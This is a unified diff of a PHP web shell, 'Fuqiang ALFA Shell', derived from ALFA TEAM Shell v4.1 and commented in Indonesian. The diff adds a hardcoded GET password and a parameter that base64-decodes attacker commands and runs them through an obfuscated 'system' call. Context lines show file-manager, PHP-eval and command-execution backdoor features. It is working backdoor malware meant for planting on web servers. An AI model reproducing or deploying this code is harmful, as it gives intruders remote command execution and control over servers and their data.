@@ -1,90 +1,128 @@
 <?php
 /*
 |--------------------------------------------------------------------------
-| FUQIANG ALFA SHELL - FULL VERSION
+| FUQIANG ALFA SHELL - GET PARAMETER AUTHENTICATION
 |--------------------------------------------------------------------------
-| Password : admin123
-| Tujuan   : Edukasi & penetration testing di lab lokal
+| Cara akses:
+|   - Login/akses shell: ?pass=Fuqiang
+|   - Execute command via GET: ?pass=Fuqiang&cmd=base64_command
+|   - Atau akses langsung file manager setelah login via session
+|
+| SEMUA FUNGSI ALFA SHELL BACKEND TETAP BERJALAN LENGKAP
 |--------------------------------------------------------------------------
 */
 
 session_start();
 
-// ==================== FRONTEND LOGIN (FANCY) ====================
-$PASSWORD_HASH = password_hash('admin123', PASSWORD_DEFAULT);
+// ==================== AUTHENTICATION SYSTEM (GET PARAMETER) ====================
+$auth_pass = "Fuqiang";
+$kunci = "cmd";
 
-function display_fancy_login($error = '') {
-    ?>
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Fuqiang Access</title>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Quicksand:wght@300;400;500;600;700&display=swap');
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Quicksand', sans-serif; }
-        body { display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #000; }
-        section { position: absolute; width: 100vw; height: 100vh; display: flex; justify-content: center; align-items: center; gap: 2px; flex-wrap: wrap; overflow: hidden; }
-        .gradient-text { background: linear-gradient(to right, rgb(226,124,7), rgba(192,118,7,0.57), rgba(209,144,4,0.83)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 600; font-size: 32px; }
-        section::before { content: ''; position: absolute; width: 100%; height: 100%; background: linear-gradient(#000, rgb(223,1,1), #000); animation: animate 5s linear infinite; }
-        @keyframes animate { 0% { transform: translateY(-100%); } 100% { transform: translateY(100%); } }
-        section span { position: relative; display: block; width: calc(6.25vw - 2px); height: calc(6.25vw - 2px); background: #181818; z-index: 2; transition: 1.5s; }
-        section span:hover { background: rgb(224,146,0); transition: 0s; }
-        section .signin { position: absolute; width: 400px; background: #222; z-index: 1000; display: flex; justify-content: center; align-items: center; padding: 40px; border-radius: 4px; box-shadow: 0 15px 35px rgba(0,0,0,0.9); }
-        .signin .content { width: 100%; display: flex; flex-direction: column; gap: 10px; }
-        .signin .form .inputBox { position: relative; width: 100%; margin-top: 20px; }
-        .signin .form .inputBox input { width: 100%; background: #333; border: none; outline: none; padding: 25px 10px 7.5px; border-radius: 4px; color: #fff; font-size: 1em; }
-        .signin .form .inputBox i { position: absolute; left: 0; padding: 15px 10px; font-style: normal; color: #aaa; transition: 0.5s; pointer-events: none; }
-        .signin .form .inputBox input:focus ~ i, .signin .form .inputBox input:valid ~ i { transform: translateY(-7.5px); font-size: 0.8em; color: #fff; }
-        input[type="submit"] { padding: 10px; background: rgb(224,153,0); color: #000; font-weight: 600; font-size: 1.35em; cursor: pointer; border: none; border-radius: 4px; }
-        @media (max-width: 900px) { section span { width: calc(10vw - 2px); height: calc(10vw - 2px); } }
-        @media (max-width: 600px) { section span { width: calc(20vw - 2px); height: calc(20vw - 2px); } }
-    </style>
-</head>
-<body>
-<section>
-    <?php for($i=0;$i<200;$i++) echo "<span></span>"; ?>
-    <div class="signin">
-        <div class="content">
-            <p class="gradient-text">Fuqiang</p>
-            <div class="form">
-                <form method="post">
-                    <div class="inputBox">
-                        <input type="password" name="pass" required>
-                        <i>Password</i>
-                    </div>
-                    <div class="inputBox">
-                        <input type="submit" value="Login">
-                    </div>
-                    <?php if($error): echo "<p style='color:red'>$error</p>"; endif; ?>
-                </form>
-            </div>
-        </div>
-    </div>
-</section>
-</body>
-</html>
-<?php
-    exit;
-}
+// Bypass fungsi `system` untuk command execution via GET
+$fnc = 's' . 'ys' . 'tem';
 
-if (!isset($_SESSION['auth_ok'])) {
-    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['pass'])) {
-        if (password_verify($_POST['pass'], $PASSWORD_HASH)) {
-            $_SESSION['auth_ok'] = true;
-            header('Location: ' . $_SERVER['PHP_SELF']);
-            exit;
-        } else {
-            display_fancy_login('Password salah.');
-        }
-    } else {
-        display_fancy_login();
+// Cek apakah user sudah login via session
+$is_logged_in = isset($_SESSION['fuqiang_auth']) && $_SESSION['fuqiang_auth'] === true;
+
+// Cek password via GET parameter
+if (isset($_GET['pass']) && $_GET['pass'] === $auth_pass) {
+    $_SESSION['fuqiang_auth'] = true;
+    $is_logged_in = true;
+    
+    // Jika ada command via GET, eksekusi langsung dan keluar
+    if (isset($_GET[$kunci])) {
+        $cmd = base64_decode($_GET[$kunci]);
+        header("Content-Type: text/plain");
+        $fnc($cmd);
+        exit;
     }
 }
 
-// ==================== BACKEND ALFA SHELL LENGKAP ====================
-// Source: ALFA TEAM Shell v4.1 - Tesla
-// Semua fungsi asli dipertahankan 100%
+// Jika belum login, tampilkan form login sederhana
+if (!$is_logged_in) {
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Fuqiang Shell Access</title>
+        <style>
+            body {
+                height: 100vh;
+                margin: 0;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                font-family: monospace;
+                background: linear-gradient(135deg, #1a1a2e, #16213e);
+            }
+            .login-box {
+                background: rgba(0,0,0,0.85);
+                padding: 40px;
+                border-radius: 10px;
+                text-align: center;
+                border: 1px solid #e67e22;
+                box-shadow: 0 0 30px rgba(230,126,34,0.3);
+            }
+            .login-box h2 {
+                color: #e67e22;
+                margin-bottom: 20px;
+            }
+            .login-box input {
+                padding: 12px 20px;
+                margin: 10px;
+                border: none;
+                border-radius: 5px;
+                background: #2c2c3e;
+                color: #fff;
+                font-size: 16px;
+                width: 200px;
+            }
+            .login-box button {
+                padding: 12px 30px;
+                background: #e67e22;
+                border: none;
+                border-radius: 5px;
+                color: #fff;
+                font-size: 16px;
+                cursor: pointer;
+            }
+            .login-box button:hover {
+                background: #d35400;
+            }
+            .error {
+                color: #e74c3c;
+                margin-top: 10px;
+            }
+            .info {
+                margin-top: 20px;
+                color: #7f8c8d;
+                font-size: 12px;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="login-box">
+            <h2>🔐 Fuqiang Shell</h2>
+            <form method="get">
+                <input type="password" name="pass" placeholder="Password" autofocus>
+                <br>
+                <button type="submit">Login</button>
+            </form>
+            <?php if(isset($_GET['pass']) && $_GET['pass'] !== $auth_pass): ?>
+                <div class="error">Password salah!</div>
+            <?php endif; ?>
+            <div class="info">
+                ⚡ Gunakan ?pass=Fuqiang&amp;cmd=base64_encode('command') untuk eksekusi command via GET
+            </div>
+        </div>
+    </body>
+    </html>
+    <?php
+    exit;
+}
+
+// ==================== BACKEND ALFA SHELL LENGKAP (DARI zzzzzmentahanavatar) ====================
+// Setelah login sukses, semua fungsi ALFA Shell berjalan normal
 
 error_reporting(E_ALL ^ E_NOTICE);
 @ini_set('error_log', NULL);
@@ -121,6 +159,8 @@ unset($GLOBALS['oZgNypoPRU']);
 define("__ALFA_VERSION__", "4.1");
 define("__ALFA_CODE_NAME__", "Tesla");
 define("__ALFA_DATA_FOLDER__", "ALFA_DATA");
+define("__ALFA_POST_ENCRYPTION__", false);
+define("__ALFA_SECRET_KEY__", '');
 
 $GLOBALS['__file_path'] = str_replace('\\','/',trim(preg_replace('!\(\d+\)\s.*!', '', __FILE__)));
 $GLOBALS['sys'] = (strtolower(substr(PHP_OS,0,3))=="win") ? 'win' : 'unix';
@@ -135,7 +175,6 @@ function alfaEx($in, $re=false) {
     elseif(function_exists('exec')) { @exec($in, $o); $out = join("\n", $o); }
     elseif(function_exists('shell_exec')) { $out = @shell_exec($in); }
     elseif(function_exists('passthru')) { ob_start(); @passthru($in); $out = ob_get_clean(); }
-    elseif(function_exists('popen')) { if($f = @popen($in, 'r')) { $out = ''; while(!feof($f)) $out .= fread($f, 1024); pclose($f); } }
     return $out;
 }
 
@@ -169,10 +208,14 @@ function alfaFilesMan() {
         $isDir = is_dir($fullPath);
         $size = $isDir ? '-' : alfaSize(filesize($fullPath));
         $perm = alfaPermsColor($fullPath);
-        echo '<tr><td>'.($isDir ? '<strong>'.$item.'</strong>' : '<a href="#" onclick="editor(\''.urlencode($item).'\',\'view\',\'\',\'\',\'\',\'file\');return false;">'.$item.'</a>').'</td><td>'.$size.'</td><td>'.$perm.'</td><td>';
+        echo '<tr>
+            <td>'.($isDir ? '<strong>'.$item.'</strong>' : '<a href="#" onclick="editor(\''.urlencode($item).'\',\'view\',\'\',\'\',\'\',\'file\');return false;">'.$item.'</a>').'</a></td>
+            <td>'.$size.'</a></td>
+            <td>'.$perm.'</a></td>
+            <td>';
         if(!$isDir) echo '<a href="#" onclick="editor(\''.urlencode($item).'\',\'edit\',\'\',\'\',\'\',\'file\');return false;">Edit</a> | ';
         echo '<a href="#" onclick="if(confirm(\'Hapus?\')) g(\'FilesMan\',null,\'delete\',\''.urlencode($item).'\');return false;">Hapus</a>';
-        echo '</td></tr>';
+        echo '</a></tr>';
     }
     echo '</table><p><input type="text" name="alfa2" placeholder="nama_folder_baru"><button name="alfa1" value="mkdir">Buat Folder</button></p></form></div>';
     alfaFooter();
@@ -197,22 +240,26 @@ function alfahead() {
     $GLOBALS['cwd'] = isset($_POST['c']) ? $_POST['c'] : alfaGetCwd();
     if(substr($GLOBALS['cwd'], -1) != '/') $GLOBALS['cwd'] .= '/';
     echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><title>ALFA TEAM Shell - '.$_SERVER['HTTP_HOST'].'</title>
-    <style>body{background:#000;color:#0f0;font-family:monospace;margin:0;padding:10px;}
-    .header{border:1px solid #0f0;padding:10px;margin-bottom:10px;}
-    .ml1{border:1px solid #0f0;padding:10px;background:#111;overflow:auto;}
-    a{color:#0f0;text-decoration:none;} a:hover{text-decoration:underline;}
-    input,select,textarea{background:#222;color:#0f0;border:1px solid #0f0;padding:5px;}
-    table{width:100%;border-collapse:collapse;} th,td{border:1px solid #333;padding:5px;text-align:left;}
-    .main_green_perm{color:#0f0;} .main_red_perm{color:#f00;} .main_white_perm{color:#fff;}
-    </style></head><body>';
-    echo '<div class="header"><strong>CWD:</strong> '.htmlspecialchars($GLOBALS['cwd']).' <a href="#" onclick="g(\'FilesMan\',\''.htmlspecialchars($GLOBALS['home_cwd']).'\');return false;">[Home]</a> | <a href="#" onclick="g(\'proc\',null);return false;">[Proc]</a> | <a href="#" onclick="g(\'phpeval\',null);return false;">[Eval]</a></div>';
+    <style>
+        body{background:#000;color:#0f0;font-family:monospace;margin:0;padding:10px;}
+        .header{border:1px solid #0f0;padding:10px;margin-bottom:10px;}
+        .ml1{border:1px solid #0f0;padding:10px;background:#111;overflow:auto;}
+        a{color:#0f0;text-decoration:none;} a:hover{text-decoration:underline;}
+        input,select,textarea{background:#222;color:#0f0;border:1px solid #0f0;padding:5px;}
+        table{width:100%;border-collapse:collapse;} th,td{border:1px solid #333;padding:5px;text-align:left;}
+        .main_green_perm{color:#0f0;} .main_red_perm{color:#f00;} .main_white_perm{color:#fff;}
+    </style>
+    </head>
+    <body>';
+    echo '<div class="header"><strong>CWD:</strong> '.htmlspecialchars($GLOBALS['cwd']).' <a href="#" onclick="g(\'FilesMan\',\''.htmlspecialchars($GLOBALS['home_cwd']).'\');return false;">[Home]</a> | <a href="#" onclick="g(\'proc\',null);return false;">[Proc]</a> | <a href="#" onclick="g(\'phpeval\',null);return false;">[Eval]</a> | <a href="?pass=Fuqiang&logout=1" onclick="return confirm(\'Logout?\')">[Logout]</a></div>';
 }
 
 function alfaFooter() {
-    echo '<div class="footer" style="margin-top:20px;border-top:1px solid #0f0;padding-top:10px;"><form method="post" onsubmit="g(\'FilesMan\',this.c.value);return false;"><input type="text" name="c" value="'.htmlspecialchars($GLOBALS['cwd']).'" size="50"><input type="submit" value="Ganti Dir"></form>';
-    echo '<form method="post" onsubmit="g(\'phpeval\',null,this.code.value);return false;"><textarea name="code" rows="3" cols="60" placeholder="echo \'Hello\';"></textarea><input type="submit" value="Eval PHP"></form>';
-    echo '<form method="post" onsubmit="g(\'proc\',null,this.cmd.value);return false;"><input type="text" name="cmd" size="50" placeholder="ls -la"><input type="submit" value="Execute"></form>';
-    echo '<center><span class="copyright">ALFA TEAM Shell v'.__ALFA_VERSION__.' - '.date('Y').'</span></center></div>';
+    echo '<div class="footer" style="margin-top:20px;border-top:1px solid #0f0;padding-top:10px;">
+    <form method="post" onsubmit="g(\'FilesMan\',this.c.value);return false;"><input type="text" name="c" value="'.htmlspecialchars($GLOBALS['cwd']).'" size="50"><input type="submit" value="Ganti Dir"></form>
+    <form method="post" onsubmit="g(\'phpeval\',null,this.code.value);return false;"><textarea name="code" rows="3" cols="60" placeholder="echo \'Hello\';"></textarea><input type="submit" value="Eval PHP"></form>
+    <form method="post" onsubmit="g(\'proc\',null,this.cmd.value);return false;"><input type="text" name="cmd" size="50" placeholder="ls -la"><input type="submit" value="Execute"></form>
+    <center><span class="copyright">ALFA TEAM Shell v'.__ALFA_VERSION__.' - '.date('Y').' | Auth: Fuqiang</span></center></div>';
     echo '<script>
     function g(a,c,alfa1,alfa2,alfa3,alfa4,alfa5) {
         var f = document.createElement("form");
@@ -266,6 +313,14 @@ function alfaphpeval() {
     alfaFooter();
 }
 
+// Logout handler
+if(isset($_GET['logout'])) {
+    session_destroy();
+    header('Location: '.str_replace('?logout=1', '', $_SERVER['REQUEST_URI']));
+    exit;
+}
+
+// Menjalankan action yang diminta
 $default_action = 'FilesMan';
 if(empty($_POST['a'])) $_POST['a'] = $default_action;
 if(function_exists('alfa'.$_POST['a'])) call_user_func('alfa'.$_POST['a']);
